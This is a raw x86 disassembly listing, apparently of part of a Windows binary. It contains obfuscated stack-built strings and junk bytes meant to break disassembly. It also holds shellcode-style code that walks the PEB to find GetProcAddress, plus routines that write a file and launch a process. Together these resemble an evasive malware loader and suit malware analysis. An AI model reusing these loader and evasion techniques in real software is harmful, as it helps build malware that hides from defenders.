 1005688:	8b 85 b0 fa ff ff    	mov    -0x550(%ebp),%eax
 100568e:	8d 84 05 ac f9 ff ff 	lea    -0x654(%ebp,%eax,1),%eax
 1005695:	50                   	push   %eax
 1005696:	e8 9c e2 ff ff       	call   0x1003937
 100569b:	83 c4 0c             	add    $0xc,%esp
 100569e:	8d 85 ac f9 ff ff    	lea    -0x654(%ebp),%eax
 10056a4:	89 85 60 fc ff ff    	mov    %eax,-0x3a0(%ebp)
 10056aa:	e9 8f 02 00 00       	jmp    0x100593e
 10056af:	83 bd 04 f9 ff ff 03 	cmpl   $0x3,-0x6fc(%ebp)
 10056b6:	0f 85 94 00 00 00    	jne    0x1005750
 10056bc:	80 a5 54 f8 ff ff 00 	andb   $0x0,-0x7ac(%ebp)
 10056c3:	80 a5 55 f8 ff ff 00 	andb   $0x0,-0x7ab(%ebp)
 10056ca:	c6 85 56 f8 ff ff ed 	movb   $0xed,-0x7aa(%ebp)
 10056d1:	80 a5 57 f8 ff ff 00 	andb   $0x0,-0x7a9(%ebp)
 10056d8:	c6 85 58 f8 ff ff 4e 	movb   $0x4e,-0x7a8(%ebp)
 10056df:	c6 85 59 f8 ff ff 55 	movb   $0x55,-0x7a7(%ebp)
 10056e6:	c6 85 5a f8 ff ff 56 	movb   $0x56,-0x7a6(%ebp)
 10056ed:	c6 85 5b f8 ff ff 7e 	movb   $0x7e,-0x7a5(%ebp)
 10056f4:	c6 85 5c f8 ff ff 21 	movb   $0x21,-0x7a4(%ebp)
 10056fb:	c6 85 5d f8 ff ff 20 	movb   $0x20,-0x7a3(%ebp)
 1005702:	c6 85 5e f8 ff ff 3c 	movb   $0x3c,-0x7a2(%ebp)
 1005709:	c6 85 5f f8 ff ff 76 	movb   $0x76,-0x7a1(%ebp)
 1005710:	c6 85 60 f8 ff ff 7e 	movb   $0x7e,-0x7a0(%ebp)
 1005717:	c6 85 61 f8 ff ff 7e 	movb   $0x7e,-0x79f(%ebp)
 100571e:	c6 85 62 f8 ff ff 12 	movb   $0x12,-0x79e(%ebp)
 1005725:	6a 0b                	push   $0xb
 1005727:	8d 85 54 f8 ff ff    	lea    -0x7ac(%ebp),%eax
 100572d:	50                   	push   %eax
 100572e:	e8 a3 e2 ff ff       	call   0x10039d6
 1005733:	59                   	pop    %ecx
 1005734:	50                   	push   %eax
 1005735:	8b 85 c8 fc ff ff    	mov    -0x338(%ebp),%eax
 100573b:	8d 84 05 d0 fd ff ff 	lea    -0x230(%ebp,%eax,1),%eax
 1005742:	50                   	push   %eax
 1005743:	e8 ef e1 ff ff       	call   0x1003937
 1005748:	83 c4 0c             	add    $0xc,%esp
 100574b:	e9 ee 01 00 00       	jmp    0x100593e
 1005750:	83 bd 04 f9 ff ff 04 	cmpl   $0x4,-0x6fc(%ebp)
 1005757:	0f 85 9d 00 00 00    	jne    0x10057fa
 100575d:	80 a5 44 f8 ff ff 00 	andb   $0x0,-0x7bc(%ebp)
 1005764:	80 a5 45 f8 ff ff 00 	andb   $0x0,-0x7bb(%ebp)
 100576b:	c6 85 46 f8 ff ff 02 	movb   $0x2,-0x7ba(%ebp)
 1005772:	80 a5 47 f8 ff ff 00 	andb   $0x0,-0x7b9(%ebp)
 1005779:	c6 85 48 f8 ff ff a1 	movb   $0xa1,-0x7b8(%ebp)
 1005780:	c6 85 49 f8 ff ff b2 	movb   $0xb2,-0x7b7(%ebp)
 1005787:	c6 85 4a f8 ff ff b1 	movb   $0xb1,-0x7b6(%ebp)
 100578e:	c6 85 4b f8 ff ff b8 	movb   $0xb8,-0x7b5(%ebp)
 1005795:	c6 85 4c f8 ff ff cf 	movb   $0xcf,-0x7b4(%ebp)
 100579c:	c6 85 4d f8 ff ff ce 	movb   $0xce,-0x7b3(%ebp)
 10057a3:	c6 85 4e f8 ff ff d3 	movb   $0xd3,-0x7b2(%ebp)
 10057aa:	c6 85 4f f8 ff ff 99 	movb   $0x99,-0x7b1(%ebp)
 10057b1:	c6 85 50 f8 ff ff 91 	movb   $0x91,-0x7b0(%ebp)
 10057b8:	c6 85 51 f8 ff ff 91 	movb   $0x91,-0x7af(%ebp)
 10057bf:	c6 85 52 f8 ff ff fd 	movb   $0xfd,-0x7ae(%ebp)
 10057c6:	e8 fb e1 ff ff       	call   0x10039c6
 10057cb:	6f                   	outsl  %ds:(%esi),(%dx)
 10057cc:	b0 55                	mov    $0x55,%al
 10057ce:	2e 6a 0b             	cs push $0xb
 10057d1:	8d 85 44 f8 ff ff    	lea    -0x7bc(%ebp),%eax
 10057d7:	50                   	push   %eax
 10057d8:	e8 f9 e1 ff ff       	call   0x10039d6
 10057dd:	59                   	pop    %ecx
 10057de:	50                   	push   %eax
 10057df:	8b 85 c8 fc ff ff    	mov    -0x338(%ebp),%eax
 10057e5:	8d 84 05 d0 fd ff ff 	lea    -0x230(%ebp,%eax,1),%eax
 10057ec:	50                   	push   %eax
 10057ed:	e8 45 e1 ff ff       	call   0x1003937
 10057f2:	83 c4 0c             	add    $0xc,%esp
 10057f5:	e9 44 01 00 00       	jmp    0x100593e
 10057fa:	83 bd 04 f9 ff ff 05 	cmpl   $0x5,-0x6fc(%ebp)
 1005801:	0f 85 94 00 00 00    	jne    0x100589b
 1005807:	80 a5 34 f8 ff ff 00 	andb   $0x0,-0x7cc(%ebp)
 100580e:	80 a5 35 f8 ff ff 00 	andb   $0x0,-0x7cb(%ebp)
 1005815:	c6 85 36 f8 ff ff 3f 	movb   $0x3f,-0x7ca(%ebp)
 100581c:	80 a5 37 f8 ff ff 00 	andb   $0x0,-0x7c9(%ebp)
 1005823:	c6 85 38 f8 ff ff 9c 	movb   $0x9c,-0x7c8(%ebp)
 100582a:	c6 85 39 f8 ff ff 90 	movb   $0x90,-0x7c7(%ebp)
 1005831:	c6 85 3a f8 ff ff 93 	movb   $0x93,-0x7c6(%ebp)
 1005838:	c6 85 3b f8 ff ff 81 	movb   $0x81,-0x7c5(%ebp)
 100583f:	c6 85 3c f8 ff ff 90 	movb   $0x90,-0x7c4(%ebp)
 1005846:	c6 85 3d f8 ff ff ac 	movb   $0xac,-0x7c3(%ebp)
 100584d:	c6 85 3e f8 ff ff ee 	movb   $0xee,-0x7c2(%ebp)
 1005854:	c6 85 3f f8 ff ff a4 	movb   $0xa4,-0x7c1(%ebp)
 100585b:	c6 85 40 f8 ff ff ac 	movb   $0xac,-0x7c0(%ebp)
 1005862:	c6 85 41 f8 ff ff ac 	movb   $0xac,-0x7bf(%ebp)
 1005869:	c6 85 42 f8 ff ff c0 	movb   $0xc0,-0x7be(%ebp)
 1005870:	6a 0b                	push   $0xb
 1005872:	8d 85 34 f8 ff ff    	lea    -0x7cc(%ebp),%eax
 1005878:	50                   	push   %eax
 1005879:	e8 58 e1 ff ff       	call   0x10039d6
 100587e:	59                   	pop    %ecx
 100587f:	50                   	push   %eax
 1005880:	8b 85 c8 fc ff ff    	mov    -0x338(%ebp),%eax
 1005886:	8d 84 05 d0 fd ff ff 	lea    -0x230(%ebp,%eax,1),%eax
 100588d:	50                   	push   %eax
 100588e:	e8 a4 e0 ff ff       	call   0x1003937
 1005893:	83 c4 0c             	add    $0xc,%esp
 1005896:	e9 a3 00 00 00       	jmp    0x100593e
 100589b:	83 bd 04 f9 ff ff 06 	cmpl   $0x6,-0x6fc(%ebp)
 10058a2:	0f 85 91 00 00 00    	jne    0x1005939
 10058a8:	80 a5 24 f8 ff ff 00 	andb   $0x0,-0x7dc(%ebp)
 10058af:	80 a5 25 f8 ff ff 00 	andb   $0x0,-0x7db(%ebp)
 10058b6:	c6 85 26 f8 ff ff 11 	movb   $0x11,-0x7da(%ebp)
 10058bd:	80 a5 27 f8 ff ff 00 	andb   $0x0,-0x7d9(%ebp)
 10058c4:	c6 85 28 f8 ff ff b2 	movb   $0xb2,-0x7d8(%ebp)
 10058cb:	c6 85 29 f8 ff ff 8b 	movb   $0x8b,-0x7d7(%ebp)
 10058d2:	c6 85 2a f8 ff ff 9c 	movb   $0x9c,-0x7d6(%ebp)
 10058d9:	c6 85 2b f8 ff ff 9c 	movb   $0x9c,-0x7d5(%ebp)
 10058e0:	c6 85 2c f8 ff ff 81 	movb   $0x81,-0x7d4(%ebp)
 10058e7:	c6 85 2d f8 ff ff 9c 	movb   $0x9c,-0x7d3(%ebp)
 10058ee:	c6 85 2e f8 ff ff c0 	movb   $0xc0,-0x7d2(%ebp)
 10058f5:	c6 85 2f f8 ff ff 82 	movb   $0x82,-0x7d1(%ebp)
 10058fc:	c6 85 30 f8 ff ff 81 	movb   $0x81,-0x7d0(%ebp)
 1005903:	c6 85 31 f8 ff ff 89 	movb   $0x89,-0x7cf(%ebp)
 100590a:	c6 85 32 f8 ff ff ee 	movb   $0xee,-0x7ce(%ebp)
 1005911:	6a 0b                	push   $0xb
 1005913:	8d 85 24 f8 ff ff    	lea    -0x7dc(%ebp),%eax
 1005919:	50                   	push   %eax
 100591a:	e8 b7 e0 ff ff       	call   0x10039d6
 100591f:	59                   	pop    %ecx
 1005920:	50                   	push   %eax
 1005921:	8b 85 c8 fc ff ff    	mov    -0x338(%ebp),%eax
 1005927:	8d 84 05 d0 fd ff ff 	lea    -0x230(%ebp,%eax,1),%eax
 100592e:	50                   	push   %eax
 100592f:	e8 03 e0 ff ff       	call   0x1003937
 1005934:	83 c4 0c             	add    $0xc,%esp
 1005937:	eb 05                	jmp    0x100593e
 1005939:	e9 2e 01 00 00       	jmp    0x1005a6c
 100593e:	8b 85 04 f9 ff ff    	mov    -0x6fc(%ebp),%eax
 1005944:	40                   	inc    %eax
 1005945:	89 85 04 f9 ff ff    	mov    %eax,-0x6fc(%ebp)
 100594b:	83 a5 84 fc ff ff 00 	andl   $0x0,-0x37c(%ebp)
 1005952:	e8 6f e0 ff ff       	call   0x10039c6
 1005957:	7b c0                	jnp    0x1005919
 1005959:	89 4d ff             	mov    %ecx,-0x1(%ebp)
 100595c:	b5 60                	mov    $0x60,%ch
 100595e:	fc                   	cld
 100595f:	ff                   	(bad)
 1005960:	ff                   	(bad)
 1005961:	ff 95 fc f8 ff ff    	call   *-0x704(%ebp)
 1005967:	89 85 5c fc ff ff    	mov    %eax,-0x3a4(%ebp)
 100596d:	83 bd 5c fc ff ff 00 	cmpl   $0x0,-0x3a4(%ebp)
 1005974:	74 33                	je     0x10059a9
 1005976:	8d 85 ec f8 ff ff    	lea    -0x714(%ebp),%eax
 100597c:	50                   	push   %eax
 100597d:	e8 54 e0 ff ff       	call   0x10039d6
 1005982:	59                   	pop    %ecx
 1005983:	50                   	push   %eax
 1005984:	ff b5 5c fc ff ff    	push   -0x3a4(%ebp)
 100598a:	ff 75 14             	push   0x14(%ebp)
 100598d:	e8 f9 df ff ff       	call   0x100398b
 1005992:	83 c4 0c             	add    $0xc,%esp
 1005995:	89 85 84 fc ff ff    	mov    %eax,-0x37c(%ebp)
 100599b:	83 bd 84 fc ff ff 00 	cmpl   $0x0,-0x37c(%ebp)
 10059a2:	75 05                	jne    0x10059a9
 10059a4:	e9 bf f9 ff ff       	jmp    0x1005368
 10059a9:	83 bd 84 fc ff ff 00 	cmpl   $0x0,-0x37c(%ebp)
 10059b0:	74 05                	je     0x10059b7
 10059b2:	e9 b5 00 00 00       	jmp    0x1005a6c
 10059b7:	6a 00                	push   $0x0
 10059b9:	6a 00                	push   $0x0
 10059bb:	6a 02                	push   $0x2
 10059bd:	6a 00                	push   $0x0
 10059bf:	6a 02                	push   $0x2
 10059c1:	68 00 00 00 40       	push   $0x40000000
 10059c6:	ff b5 60 fc ff ff    	push   -0x3a0(%ebp)
 10059cc:	ff 95 38 fc ff ff    	call   *-0x3c8(%ebp)
 10059d2:	89 85 80 fc ff ff    	mov    %eax,-0x380(%ebp)
 10059d8:	83 bd 80 fc ff ff ff 	cmpl   $0xffffffff,-0x380(%ebp)
 10059df:	74 2f                	je     0x1005a10
 10059e1:	6a 00                	push   $0x0
 10059e3:	8d 85 3c f9 ff ff    	lea    -0x6c4(%ebp),%eax
 10059e9:	50                   	push   %eax
 10059ea:	ff b5 74 fc ff ff    	push   -0x38c(%ebp)
 10059f0:	ff b5 b8 f8 ff ff    	push   -0x748(%ebp)
 10059f6:	ff b5 80 fc ff ff    	push   -0x380(%ebp)
 10059fc:	ff 95 d0 f8 ff ff    	call   *-0x730(%ebp)
 1005a02:	ff b5 80 fc ff ff    	push   -0x380(%ebp)
 1005a08:	ff 95 80 f9 ff ff    	call   *-0x680(%ebp)
 1005a0e:	eb 05                	jmp    0x1005a15
 1005a10:	e9 53 f9 ff ff       	jmp    0x1005368
 1005a15:	83 a5 84 fc ff ff 00 	andl   $0x0,-0x37c(%ebp)
 1005a1c:	ff b5 60 fc ff ff    	push   -0x3a0(%ebp)
 1005a22:	ff 95 fc f8 ff ff    	call   *-0x704(%ebp)
 1005a28:	89 85 5c fc ff ff    	mov    %eax,-0x3a4(%ebp)
 1005a2e:	83 bd 5c fc ff ff 00 	cmpl   $0x0,-0x3a4(%ebp)
 1005a35:	74 25                	je     0x1005a5c
 1005a37:	8d 85 ec f8 ff ff    	lea    -0x714(%ebp),%eax
 1005a3d:	50                   	push   %eax
 1005a3e:	e8 93 df ff ff       	call   0x10039d6
 1005a43:	59                   	pop    %ecx
 1005a44:	50                   	push   %eax
 1005a45:	ff b5 5c fc ff ff    	push   -0x3a4(%ebp)
 1005a4b:	ff 75 14             	push   0x14(%ebp)
 1005a4e:	e8 38 df ff ff       	call   0x100398b
 1005a53:	83 c4 0c             	add    $0xc,%esp
 1005a56:	89 85 84 fc ff ff    	mov    %eax,-0x37c(%ebp)
 1005a5c:	83 bd 84 fc ff ff 00 	cmpl   $0x0,-0x37c(%ebp)
 1005a63:	74 02                	je     0x1005a67
 1005a65:	eb 05                	jmp    0x1005a6c
 1005a67:	e9 fc f8 ff ff       	jmp    0x1005368
 1005a6c:	83 bd 84 fc ff ff 00 	cmpl   $0x0,-0x37c(%ebp)
 1005a73:	0f 85 9d 00 00 00    	jne    0x1005b16
 1005a79:	8b 85 b8 f8 ff ff    	mov    -0x748(%ebp),%eax
 1005a7f:	89 85 14 f8 ff ff    	mov    %eax,-0x7ec(%ebp)
 1005a85:	8b 85 74 fc ff ff    	mov    -0x38c(%ebp),%eax
 1005a8b:	89 85 18 f8 ff ff    	mov    %eax,-0x7e8(%ebp)
 1005a91:	83 a5 20 f8 ff ff 00 	andl   $0x0,-0x7e0(%ebp)
 1005a98:	68 00 10 00 00       	push   $0x1000
 1005a9d:	6a 08                	push   $0x8
 1005a9f:	ff b5 8c f9 ff ff    	push   -0x674(%ebp)
 1005aa5:	ff 95 84 f9 ff ff    	call   *-0x67c(%ebp)
 1005aab:	89 85 1c f8 ff ff    	mov    %eax,-0x7e4(%ebp)
 1005ab1:	ff b5 1c f8 ff ff    	push   -0x7e4(%ebp)
 1005ab7:	8d 85 14 f8 ff ff    	lea    -0x7ec(%ebp),%eax
 1005abd:	50                   	push   %eax
 1005abe:	ff b5 b8 f8 ff ff    	push   -0x748(%ebp)
 1005ac4:	ff 75 18             	push   0x18(%ebp)
 1005ac7:	ff 75 14             	push   0x14(%ebp)
 1005aca:	e8 d3 e0 ff ff       	call   0x1003ba2
 1005acf:	83 c4 14             	add    $0x14,%esp
 1005ad2:	89 85 20 f8 ff ff    	mov    %eax,-0x7e0(%ebp)
 1005ad8:	83 bd 20 f8 ff ff 00 	cmpl   $0x0,-0x7e0(%ebp)
 1005adf:	74 21                	je     0x1005b02
 1005ae1:	8d 85 ec f8 ff ff    	lea    -0x714(%ebp),%eax
 1005ae7:	50                   	push   %eax
 1005ae8:	e8 e9 de ff ff       	call   0x10039d6
 1005aed:	59                   	pop    %ecx
 1005aee:	50                   	push   %eax
 1005aef:	ff b5 20 f8 ff ff    	push   -0x7e0(%ebp)
 1005af5:	e8 71 df ff ff       	call   0x1003a6b
 1005afa:	59                   	pop    %ecx
 1005afb:	59                   	pop    %ecx
 1005afc:	89 85 84 fc ff ff    	mov    %eax,-0x37c(%ebp)
 1005b02:	ff b5 1c f8 ff ff    	push   -0x7e4(%ebp)
 1005b08:	6a 01                	push   $0x1
 1005b0a:	ff b5 8c f9 ff ff    	push   -0x674(%ebp)
 1005b10:	ff 95 64 fc ff ff    	call   *-0x39c(%ebp)
 1005b16:	ff 75 1c             	push   0x1c(%ebp)
 1005b19:	ff 75 f4             	push   -0xc(%ebp)
 1005b1c:	ff b5 c0 fa ff ff    	push   -0x540(%ebp)
 1005b22:	ff b5 7c f9 ff ff    	push   -0x684(%ebp)
 1005b28:	ff b5 78 f9 ff ff    	push   -0x688(%ebp)
 1005b2e:	ff b5 54 fc ff ff    	push   -0x3ac(%ebp)
 1005b34:	ff b5 00 fc ff ff    	push   -0x400(%ebp)
 1005b3a:	ff b5 b4 fa ff ff    	push   -0x54c(%ebp)
 1005b40:	ff b5 88 f9 ff ff    	push   -0x678(%ebp)
 1005b46:	8d 85 cc fc ff ff    	lea    -0x334(%ebp),%eax
 1005b4c:	50                   	push   %eax
 1005b4d:	ff 75 fc             	push   -0x4(%ebp)
 1005b50:	ff 75 08             	push   0x8(%ebp)
 1005b53:	ff 95 84 fc ff ff    	call   *-0x37c(%ebp)
 1005b59:	5f                   	pop    %edi
 1005b5a:	5e                   	pop    %esi
 1005b5b:	5b                   	pop    %ebx
 1005b5c:	c9                   	leave
 1005b5d:	c3                   	ret
 1005b5e:	e8 41 de ff ff       	call   0x10039a4
 1005b63:	c3                   	ret
 1005b64:	3c 60                	cmp    $0x60,%al
 1005b66:	8b ec                	mov    %esp,%ebp
 1005b68:	83 c5 24             	add    $0x24,%ebp
 1005b6b:	54                   	push   %esp
 1005b6c:	e8 55 de ff ff       	call   0x10039c6
 1005b71:	3e 9d                	ds popf
 1005b73:	f3 c2 64 a1          	repz ret $0xa164
 1005b77:	30 00                	xor    %al,(%eax)
 1005b79:	00 00                	add    %al,(%eax)
 1005b7b:	8b 40 0c             	mov    0xc(%eax),%eax
 1005b7e:	8b 70 1c             	mov    0x1c(%eax),%esi
 1005b81:	ad                   	lods   %ds:(%esi),%eax
 1005b82:	80 78 1c 18          	cmpb   $0x18,0x1c(%eax)
 1005b86:	74 02                	je     0x1005b8a
 1005b88:	96                   	xchg   %eax,%esi
 1005b89:	ad                   	lods   %ds:(%esi),%eax
 1005b8a:	8b 40 08             	mov    0x8(%eax),%eax
 1005b8d:	50                   	push   %eax
 1005b8e:	e8 33 de ff ff       	call   0x10039c6
 1005b93:	9e                   	sahf
 1005b94:	bf 5c e9 8b f8       	mov    $0xf88be95c,%edi
 1005b99:	8b 47 3c             	mov    0x3c(%edi),%eax
 1005b9c:	8b 54 07 78          	mov    0x78(%edi,%eax,1),%edx
 1005ba0:	03 d7                	add    %edi,%edx
 1005ba2:	8b 4a 18             	mov    0x18(%edx),%ecx
 1005ba5:	8b 5a 20             	mov    0x20(%edx),%ebx
 1005ba8:	03 df                	add    %edi,%ebx
 1005baa:	e8 17 de ff ff       	call   0x10039c6
 1005baf:	1b 98 56 8e 49 8b    	sbb    -0x74b671aa(%eax),%ebx
 1005bb5:	34 8b                	xor    $0x8b,%al
 1005bb7:	03 f7                	add    %edi,%esi
 1005bb9:	b8 47 65 74 50       	mov    $0x50746547,%eax
 1005bbe:	39 06                	cmp    %eax,(%esi)
 1005bc0:	75 f1                	jne    0x1005bb3
 1005bc2:	b8 72 6f 63 41       	mov    $0x41636f72,%eax
 1005bc7:	39 46 04             	cmp    %eax,0x4(%esi)
 1005bca:	75 e7                	jne    0x1005bb3
 1005bcc:	e8 f5 dd ff ff       	call   0x10039c6
 1005bd1:	19 01                	sbb    %eax,(%ecx)
 1005bd3:	90                   	nop
 1005bd4:	b8 8b 5a 24 03       	mov    $0x3245a8b,%eax
 1005bd9:	df 66 8b             	fbld   -0x75(%esi)
 1005bdc:	0c 4b                	or     $0x4b,%al
 1005bde:	8b 5a 1c             	mov    0x1c(%edx),%ebx
 1005be1:	03 df                	add    %edi,%ebx
 1005be3:	8b 04 8b             	mov    (%ebx,%ecx,4),%eax
 1005be6:	03 c7                	add    %edi,%eax
 1005be8:	50                   	push   %eax
 1005be9:	e8 d8 dd ff ff       	call   0x10039c6
 1005bee:	ee                   	out    %al,(%dx)
 1005bef:	d7                   	xlat   %ds:(%ebx)
 1005bf0:	01 0d ff 75 08 ff    	add    %ecx,0xff0875ff
 1005bf6:	75 04                	jne    0x1005bfc
 1005bf8:	ff 75 00             	push   0x0(%ebp)
 1005bfb:	e8 c6 e5 ff ff       	call   0x10041c6
 1005c00:	74 1d                	je     0x1005c1f
 1005c02:	a1 50 c0 00 01       	mov    0x100c050,%eax
 1005c07:	39 45 f4             	cmp    %eax,-0xc(%ebp)
 1005c0a:	75 13                	jne    0x1005c1f
 1005c0c:	8b 0d 4c c0 00 01    	mov    0x100c04c,%ecx
 1005c12:	c7 05 48 c0 00 01 01 	movl   $0x1,0x100c048
 1005c19:	00 00 00 
 1005c1c:	88 1c 01             	mov    %bl,(%ecx,%eax,1)
 1005c1f:	ff 75 f8             	push   -0x8(%ebp)
 1005c22:	ff 15 d4 20 00 01    	call   *0x10020d4
 1005c28:	39 1d 48 c0 00 01    	cmp    %ebx,0x100c048
 1005c2e:	0f 84 09 fd ff ff    	je     0x100593d
 1005c34:	57                   	push   %edi
 1005c35:	ff 15 f0 20 00 01    	call   *0x10020f0
 1005c3b:	39 1d 48 c0 00 01    	cmp    %ebx,0x100c048
 1005c41:	74 1b                	je     0x1005c5e
 1005c43:	39 1d 00 c0 00 01    	cmp    %ebx,0x100c000
 1005c49:	74 13                	je     0x1005c5e
 1005c4b:	ff 35 4c c0 00 01    	push   0x100c04c
 1005c51:	e8 63 ea ff ff       	call   0x10046b9
 1005c56:	85 c0                	test   %eax,%eax
 1005c58:	0f 84 df fc ff ff    	je     0x100593d
 1005c5e:	39 1d 7c d0 00 01    	cmp    %ebx,0x100d07c
 1005c64:	0f 84 6c 01 00 00    	je     0x1005dd6
 1005c6a:	39 1d ac c4 00 01    	cmp    %ebx,0x100c4ac
 1005c70:	0f 85 60 01 00 00    	jne    0x1005dd6
 1005c76:	39 1d b4 c4 00 01    	cmp    %ebx,0x100c4b4
 1005c7c:	75 13                	jne    0x1005c91
 1005c7e:	ff 35 0c ce 00 01    	push   0x100ce0c
 1005c84:	53                   	push   %ebx
 1005c85:	6a 0c                	push   $0xc
 1005c87:	6a 68                	push   $0x68
 1005c89:	ff 35 04 ce 00 01    	push   0x100ce04
 1005c8f:	ff d6                	call   *%esi
 1005c91:	8b 35 0c 21 00 01    	mov    0x100210c,%esi
 1005c97:	68 80 d0 00 01       	push   $0x100d080
 1005c9c:	68 c4 25 00 01       	push   $0x10025c4
 1005ca1:	ff d6                	call   *%esi
 1005ca3:	68 40 cf 00 01       	push   $0x100cf40
 1005ca8:	68 ac 25 00 01       	push   $0x10025ac
 1005cad:	ff d6                	call   *%esi
 1005caf:	ff 35 a8 c4 00 01    	push   0x100c4a8
 1005cb5:	68 94 25 00 01       	push   $0x1002594
 1005cba:	ff d6                	call   *%esi
 1005cbc:	e8 fe da ff ff       	call   0x10037bf
 1005cc1:	a1 0c ce 00 01       	mov    0x100ce0c,%eax
 1005cc6:	38 18                	cmp    %bl,(%eax)
 1005cc8:	75 2b                	jne    0x1005cf5
 1005cca:	be 00 00 01 00       	mov    $0x10000,%esi
 1005ccf:	56                   	push   %esi
 1005cd0:	68 e0 d3 00 01       	push   $0x100d3e0
 1005cd5:	ff 35 7c d0 00 01    	push   0x100d07c
 1005cdb:	ff 15 44 20 00 01    	call   *0x1002044
 1005ce1:	3b c3                	cmp    %ebx,%eax
 1005ce3:	89 45 fc             	mov    %eax,-0x4(%ebp)
 1005ce6:	0f 84 19 fc ff ff    	je     0x1005905
 1005cec:	3b c6                	cmp    %esi,%eax
 1005cee:	72 46                	jb     0x1005d36
 1005cf0:	e9 10 fc ff ff       	jmp    0x1005905
 1005cf5:	a1 7c d0 00 01       	mov    0x100d07c,%eax
 1005cfa:	bf e0 d3 00 01       	mov    $0x100d3e0,%edi
 1005cff:	8b d7                	mov    %edi,%edx
 1005d01:	2b d0                	sub    %eax,%edx
 1005d03:	8a 08                	mov    (%eax),%cl
 1005d05:	88 0c 02             	mov    %cl,(%edx,%eax,1)
 1005d08:	40                   	inc    %eax
 1005d09:	3a cb                	cmp    %bl,%cl
 1005d0b:	75 f6                	jne    0x1005d03
 1005d0d:	a1 a8 c4 00 01       	mov    0x100c4a8,%eax
 1005d12:	8b d0                	mov    %eax,%edx
 1005d14:	8a 08                	mov    (%eax),%cl
 1005d16:	40                   	inc    %eax
 1005d17:	3a cb                	cmp    %bl,%cl
 1005d19:	75 f9                	jne    0x1005d14
 1005d1b:	2b c2                	sub    %edx,%eax
 1005d1d:	4f                   	dec    %edi
 1005d1e:	8a 4f 01             	mov    0x1(%edi),%cl
 1005d21:	47                   	inc    %edi
 1005d22:	3a cb                	cmp    %bl,%cl
 1005d24:	75 f8                	jne    0x1005d1e
 1005d26:	8b c8                	mov    %eax,%ecx
 1005d28:	c1 e9 02             	shr    $0x2,%ecx
 1005d2b:	8b f2                	mov    %edx,%esi
 1005d2d:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
 1005d2f:	8b c8                	mov    %eax,%ecx
 1005d31:	83 e1 03             	and    $0x3,%ecx
 1005d34:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
 1005d36:	6a 11                	push   $0x11
 1005d38:	59                   	pop    %ecx
 1005d39:	33 c0                	xor    %eax,%eax
 1005d3b:	8d bd 78 ff ff ff    	lea    -0x88(%ebp),%edi
 1005d41:	f3 ab                	rep stos %eax,%es:(%edi)
 1005d43:	40                   	inc    %eax
 1005d44:	89 45 a4             	mov    %eax,-0x5c(%ebp)
 1005d47:	66 89 45 a8          	mov    %ax,-0x58(%ebp)
 1005d4b:	8d 45 e0             	lea    -0x20(%ebp),%eax
 1005d4e:	50                   	push   %eax
 1005d4f:	8d 85 78 ff ff ff    	lea    -0x88(%ebp),%eax
 1005d55:	50                   	push   %eax
 1005d56:	ff 35 e4 d3 01 01    	push   0x101d3e4
 1005d5c:	c7 85 78 ff ff ff 44 	movl   $0x44,-0x88(%ebp)
 1005d63:	00 00 00 
 1005d66:	53                   	push   %ebx
 1005d67:	6a 20                	push   $0x20
 1005d69:	53                   	push   %ebx
 1005d6a:	53                   	push   %ebx
 1005d6b:	53                   	push   %ebx
 1005d6c:	68 e0 d3 00 01       	push   $0x100d3e0
 1005d71:	53                   	push   %ebx
 1005d72:	ff 15 48 20 00 01    	call   *0x1002048
 1005d78:	85 c0                	test   %eax,%eax
 1005d7a:	0f 84 85 fb ff ff    	je     0x1005905
 1005d80:	39 1d b4 c4 00 01    	cmp    %ebx,0x100c4b4
 1005d86:	75 0d                	jne    0x1005d95
 1005d88:	53                   	push   %ebx
 1005d89:	ff 35 04 ce 00 01    	push   0x100ce04
 1005d8f:	ff 15 84 21 00 01    	call   *0x1002184
 1005d95:	8b 45 e0             	mov    -0x20(%ebp),%eax
 1005d98:	6a ff                	push   $0xffffffff
 1005d9a:	50                   	push   %eax
 1005d9b:	a3 4c d0 00 01       	mov    %eax,0x100d04c
 1005da0:	ff 15 34 21 00 01    	call   *0x1002134
 1005da6:	8d 45 fc             	lea    -0x4(%ebp),%eax
 1005da9:	50                   	push   %eax
 1005daa:	ff 75 e0             	push   -0x20(%ebp)
 1005dad:	ff 15 4c 20 00 01    	call   *0x100204c
 1005db3:	ff 75 e4             	push   -0x1c(%ebp)
 1005db6:	ff 15 d4 20 00 01    	call   *0x10020d4
 1005dbc:	e8 60 ca ff ff       	call   0x1002821
 1005dc1:	81 7d fc d1 00 bf ca 	cmpl   $0xcabf00d1,-0x4(%ebp)
 1005dc8:	75 05                	jne    0x1005dcf
 1005dca:	89 5d fc             	mov    %ebx,-0x4(%ebp)
 1005dcd:	eb 46                	jmp    0x1005e15
 1005dcf:	e8 a4 cf ff ff       	call   0x1002d78
 1005dd4:	eb 3f                	jmp    0x1005e15
 1005dd6:	39 1d e0 d3 01 01    	cmp    %ebx,0x101d3e0
 1005ddc:	75 37                	jne    0x1005e15
 1005dde:	53                   	push   %ebx
 1005ddf:	ff 35 04 ce 00 01    	push   0x100ce04
 1005de5:	ff 15 84 21 00 01    	call   *0x1002184
 1005deb:	68 04 01 00 00       	push   $0x104
 1005df0:	57                   	push   %edi
 1005df1:	68 02 00 00 20       	push   $0x20000002
 1005df6:	ff 35 5c c0 00 01    	push   0x100c05c
 1005dfc:	ff 15 80 21 00 01    	call   *0x1002180
 1005e02:	68 30 00 01 00       	push   $0x10030
 1005e07:	57                   	push   %edi
 1005e08:	57                   	push   %edi
 1005e09:	ff 35 04 ce 00 01    	push   0x100ce04
 1005e0f:	ff 15 74 21 00 01    	call   *0x1002174
 1005e15:	a1 c8 c8 00 01       	mov    0x100c8c8,%eax
 1005e1a:	85 c0                	test   %eax,%eax
 1005e1c:	78 4c                	js     0x1005e6a
 1005e1e:	be 00 00 00 40       	mov    $0x40000000,%esi
 1005e23:	85 c6                	test   %eax,%esi
 1005e25:	75 39                	jne    0x1005e60
 1005e27:	ff 35 cc c8 00 01    	push   0x100c8cc
 1005e2d:	8b c8                	mov    %eax,%ecx
 1005e2f:	c1 e9 04             	shr    $0x4,%ecx
 1005e32:	83 e1 01             	and    $0x1,%ecx
 1005e35:	68 d0 c8 00 01       	push   $0x100c8d0
 1005e3a:	51                   	push   %ecx
 1005e3b:	8b c8                	mov    %eax,%ecx
 1005e3d:	d1 e9                	shr    $1,%ecx
 1005e3f:	83 e1 01             	and    $0x1,%ecx
 1005e42:	51                   	push   %ecx
 1005e43:	83 e0 01             	and    $0x1,%eax
 1005e46:	50                   	push   %eax
 1005e47:	e8 26 db ff ff       	call   0x1003972
